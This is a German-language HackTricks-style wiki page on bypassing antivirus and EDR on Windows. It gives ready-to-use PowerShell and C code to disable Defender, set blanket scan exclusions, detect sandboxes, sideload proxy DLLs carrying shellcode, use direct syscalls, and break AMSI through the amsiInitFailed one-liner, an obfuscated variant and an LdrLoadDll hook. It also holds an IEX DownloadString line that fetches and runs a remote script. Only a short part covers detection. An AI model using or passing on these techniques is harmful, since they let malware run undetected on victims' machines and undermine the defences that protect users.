# Antivirus (AV)-Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** verfasst!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um die Funktion von Windows Defender zu stoppen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um die Funktion von Windows Defender zu stoppen, indem ein anderer AV vorgetäuscht wird.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor Manipulationen an Defender

Öffentlich verfügbare Loader, die sich häufig als Game-Cheats ausgeben, werden oft als nicht signierte Node.js/Nexe-Installer ausgeliefert, die den **Benutzer zunächst zur Erhöhung der Berechtigungen auffordern** und erst danach Defender deaktivieren. Der Ablauf ist einfach:

1. Mit `net session` wird geprüft, ob administrative Berechtigungen vorhanden sind. Der Befehl ist nur erfolgreich, wenn der Aufrufer über Admin-Rechte verfügt. Ein Fehler zeigt daher an, dass der Loader als Standardbenutzer ausgeführt wird.
2. Der Loader startet sich umgehend mit dem Verb `RunAs` selbst neu, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie „gecrackte“ Software installieren, daher wird die Eingabeaufforderung normalerweise akzeptiert, wodurch die Malware die erforderlichen Rechte erhält, um die Richtlinie von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Rechteerweiterung maximieren GachiLoader-artige Ketten die blinden Flecken von Defender, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt anschließend **extrem weitreichende Ausschlüsse**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingehängte Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jede zukünftige Payload, die irgendwo auf der Festplatte abgelegt wird, ignoriert wird**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert – Angreifer behalten sich die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, sodass spätere Phasen bestätigen können, dass die Ausschlüsse bestehen bleiben, oder sie erweitern können, ohne UAC erneut auszulösen.

Da kein Defender-Dienst gestoppt wird, melden naive Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nie berührt.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei schädlich ist oder nicht: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Die statische Erkennung erfolgt durch das Markieren bekannter schädlicher Zeichenfolgen oder Byte-Arrays in einer Binary oder einem Script sowie durch das Extrahieren von Informationen aus der Datei selbst (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Prüfsumme usw.). Das bedeutet, dass du beim Einsatz bekannter öffentlicher Tools leichter entdeckt werden kannst, da sie wahrscheinlich analysiert und als schädlich markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binary verschlüsselst, kann das AV dein Programm nicht erkennen. Du benötigst jedoch eine Art Loader, der das Programm entschlüsselt und im Speicher ausführt.

- **Obfuscation**

Manchmal reicht es aus, einige Zeichenfolgen in deiner Binary oder deinem Script zu ändern, damit es das AV passiert. Je nachdem, was du obfuscaten möchtest, kann dies jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten schlechten Signaturen. Das erfordert jedoch viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente auf und weist Defender an, jedes davon einzeln zu scannen. So kann es dir genau sagen, welche Zeichenfolgen oder Bytes in deiner Binary markiert wurden.

Ich empfehle dir dringend, diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binary in einer Sandbox aus und beobachtet schädliche Aktivitäten (z. B. das Entschlüsseln und Auslesen der Passwörter deines Browsers, das Erstellen eines Minidumps von LSASS usw.). Dieser Teil kann etwas schwieriger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Vor der Ausführung schlafen** Je nachdem, wie dies implementiert ist, kann es eine gute Möglichkeit sein, die dynamische Analyse des AVs zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, damit der Workflow des Benutzers nicht unterbrochen wird. Lange Sleeps können daher die Analyse von Binaries stören. Das Problem ist, dass viele AV-Sandboxes den Sleep abhängig von seiner Implementierung einfach überspringen können.
- **Ressourcen des Computers prüfen** Normalerweise verfügen Sandboxes nur über sehr wenige Ressourcen (z. B. < 2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Du kannst auch sehr kreativ werden, indem du beispielsweise die Temperatur der CPU oder sogar die Lüftergeschwindigkeit prüfst – nicht alles wird in der Sandbox implementiert sein.
- **Computerspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation der Domain „contoso.local“ beigetreten ist, kannst du die Domain des Computers prüfen und feststellen, ob sie mit der von dir angegebenen übereinstimmt. Falls nicht, kannst du dein Programm beenden lassen.

Wie sich herausstellt, lautet der Computername der Microsoft Defender Sandbox HAL9TH. Du kannst daher vor der Detonation in deiner Malware den Computernamen prüfen. Wenn der Name HAL9TH entspricht, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Vorgehen gegen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a>-Kanal #malware-dev</p></figcaption></figure>

Wie wir bereits zuvor in diesem Beitrag gesagt haben, werden **öffentliche Tools** irgendwann **erkannt**. Daher solltest du dir eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Als Beispiel ist mimikatz wahrscheinlich eines der – wenn nicht sogar das – am häufigsten von AVs und EDRs markierten Malware-Stücke. Obwohl das Projekt selbst sehr cool ist, ist es auch ein Albtraum, damit AVs zu umgehen. Suche daher einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, achte darauf, **die automatische Übermittlung von Samples** in Defender zu deaktivieren. Und bitte, wirklich, **LADE SIE NICHT BEI VIRUSTOTAL HOCH**, wenn du langfristig Evasion erreichen möchtest. Wenn du überprüfen möchtest, ob deine Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer es möglich ist, solltest du für Evasion immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert. Daher ist dies in manchen Fällen ein sehr einfacher Trick, um eine Erkennung zu vermeiden (sofern deine Payload natürlich auf irgendeine Weise als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc in antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-Vergleich einer normalen Havoc-EXE-Payload mit einer normalen Havoc-DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die Opferanwendung und die schädliche(n) Payload(s) nebeneinander platziert werden.

Du kannst mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell-Script nach Programmen suchen, die für DLL Sideloading anfällig sind:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking innerhalb von "C:\Program Files\\" anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable programs selbst zu untersuchen**. Diese technique ist bei korrekter Umsetzung ziemlich stealthy, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, wirst du möglicherweise leicht entdeckt.

Allein das Platzieren einer malicious DLL mit dem Namen, den ein Programm zu laden erwartet, reicht nicht aus, um deinen payload zu laden, da das Programm bestimmte Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere technique namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm ausführt, vom Proxy (und malicious) DLL an die originale DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und dein payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl gibt uns zwei Dateien: eine DLL-Quellcodevorlage und die umbenannte ursprüngliche DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) encoded) als auch die Proxy-DLL haben in [antiscan.me](https://antiscan.me) eine Detection rate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass du dir den [Twitch-VOD von S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ipps­ecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) ansiehst, um mehr über das, was wir besprochen haben, im Detail zu erfahren.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Export-Eintrag einen ASCII-String in der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows-Loader:

- `TargetDll` laden, falls es noch nicht geladen wurde
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls enthält, das die Forward-Auflösung durchführt.

Dies ermöglicht eine indirekte Sideloading-Primitivtechnik: Finde eine signierte DLL, die eine Funktion exportiert, die an ein Modul mit einem Nicht-KnownDLL-Modulnamen weitergeleitet wird, und lege diese signierte DLL zusammen mit einer von einem Angreifer kontrollierten DLL ab, die exakt wie das weitergeleitete Zielmodul heißt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader den Forward auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein `DllMain` ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Codeausführung zu erhalten; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Den Forward mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forwarder zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, wird der Fehler „fehlende API“ erst angezeigt, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exports, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Weitergeleitete Exports kannst du mit Tools wie den folgenden enumerieren:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 forwarder inventory, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Detection/Verteidigung:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus nicht systembezogenen Pfaden laden, gefolgt vom Laden von non-KnownDLLs mit demselben base name aus diesem Verzeichnis
- Bei process/module chains wie diesen alarmieren: `rundll32.exe` → nicht systembezogenes `keyiso.dll` → `NCRYPTPROV.dll` in user-writable paths
- Code-Integrity-Richtlinien (WDAC/AppLocker) durchsetzen und write+execute in application directories verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein payload toolkit zum Umgehen von EDRs mithilfe von suspended processes, direct syscalls und alternativen execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf verdeckte Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher niemals nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu verketten.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs setzen häufig **User-Mode-Inline-Hooks** auf die Syscall-Stubs von `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Entry-Point auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion in den generierten Stub einfügen (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: In ein vorhandenes `syscall`-Gadget innerhalb von `ntdll` springen, sodass der Kernel-Übergang scheinbar aus `ntdll` stammt (nützlich zur heuristischen Evasion); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool.
- **Egg-hunt**: Vermeiden, dass die statische Opcode-Sequenz `0F 05` auf der Festplatte eingebettet wird; stattdessen zur Laufzeit eine Syscall-Sequenz auflösen.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: SSNs durch Sortieren der Syscall-Stubs nach virtueller Adresse ableiten, anstatt die Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Eine saubere `\KnownDlls\ntdll.dll` mappen, SSNs aus deren `.text` auslesen und sie anschließend wieder unmappen (umgeht alle In-Memory-Hooks).
- **RecycledGate**: Die VA-sortierte SSN-Ableitung mit einer Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei einem Hook auf die VA-Ableitung zurückfallen.
- **HW Breakpoint**: DR0 auf die `syscall`-Instruktion setzen und mithilfe eines VEH die SSN zur Laufzeit aus `EAX` erfassen, ohne gehookte Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Anfangs waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen. Wenn man also irgendwie Payloads **direkt im Speicher** ausführen konnte, konnte der AV nichts dagegen unternehmen, da ihm nicht genügend Einblick zur Verfügung stand.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert.

- User Account Control oder UAC (Elevation von EXE-, COM-, MSI- oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht es Antivirus-Lösungen, das Verhalten von Skripten zu untersuchen, indem Skriptinhalte in einer sowohl unverschlüsselten als auch nicht verschleierten Form bereitgestellt werden.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt unter Windows Defender den folgenden Alert.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, aus der das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber aufgrund von AMSI trotzdem im Speicher erkannt.

Darüber hinaus wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])`, um eine Ausführung im Speicher zu laden. Deshalb wird für die Ausführung im Speicher die Verwendung niedrigerer .NET-Versionen (wie 4.7.2 oder niedriger) empfohlen, wenn du AMSI umgehen möchtest.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der zu ladenden Skripte eine gute Möglichkeit sein, eine Erkennung zu umgehen.

AMSI kann Skripte jedoch auch dann deobfuskieren, wenn sie mehrere Verschleierungsebenen enthalten. Je nach Vorgehensweise kann Obfuscation daher eine schlechte Option sein. Dadurch ist das Umgehen nicht besonders unkompliziert. Manchmal reicht es allerdings aus, einige Variablennamen zu ändern, und schon funktioniert es. Es hängt also davon ab, wie stark etwas bereits als schädlich markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell-Prozess (sowie in cscript.exe, wscript.exe usw.) implementiert wird, kann dies problemlos manipuliert werden, selbst wenn man als unprivilegierter Benutzer ausgeführt wird. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, den AMSI-Scan zu umgehen.

**Forcing an Error**

Wenn die AMSI-Initialisierung fehlschlägt (amsiInitFailed), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, woraufhin Microsoft eine Signatur entwickelt hat, um eine weitere Verbreitung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was erforderlich war, war eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Anpassungen erforderlich, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich gekennzeichnet wird, sobald dieser Beitrag veröffentlicht wird. Du solltest daher keinen Code veröffentlichen, wenn dein Plan darin besteht, unerkannt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Sie besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll zu finden (zuständig für das Scannen der vom Benutzer bereitgestellten Eingaben) und sie mit Anweisungen zu überschreiben, die den Code für E_INVALIDARG zurückgeben. Auf diese Weise gibt das Ergebnis des tatsächlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt auch viele andere Techniken, die verwendet werden, um AMSI mit powershell zu umgehen. Sieh dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### AMSI durch Verhindern des Ladens von amsi.dll blockieren (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI niemals geladen und es finden für diesen Prozess keine Scans statt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten loadern (mit allem, was andernfalls AMSI laden würde).
- In Kombination mit dem Zuführen von scripts über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) lassen sich lange command-line-Artefakte vermeiden.
- Wird bei loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls script zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls script zum Umgehen von AMSI, das durch randomisierte benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke sowie zufällige Groß- und Kleinschreibung von PowerShell-Schlüsselwörtern Signaturen vermeidet.

**Die erkannte signature entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-signature aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool durchsucht den Speicher des aktuellen Prozesses nach der AMSI-signature und überschreibt sie anschließend mit NOP-Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell-Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine scripts ausführen kannst, ohne von AMSI gescannt zu werden. Das geht so:
```bash
powershell.exe -version 2
```
## PS-Logging

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Dies kann für Audit- und Troubleshooting-Zwecke nützlich sein, aber auch ein **Problem für Angreifer darstellen, die ihre Entdeckung verhindern möchten**.

Um PowerShell-Logging zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Du kannst dafür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **Powershell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Scripts ausführen kannst, ohne dass sie von AMSI gescannt werden. Dies ist folgendermaßen möglich: `powershell.exe -version 2`
- **Eine Unmanaged-Powershell-Session verwenden**: Verwende [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine Powershell ohne Schutzmechanismen zu starten (das verwendet `powerpick` von Cobal Strike).


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten. Dadurch wird die Entropie der Binary erhöht, wodurch sie für AVs und EDRs leichter erkennbar wird. Sei dabei vorsichtig und wende Verschlüsselung möglicherweise nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow **stellt zuverlässig ein nahezu originales IL** wieder her, das anschließend in Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

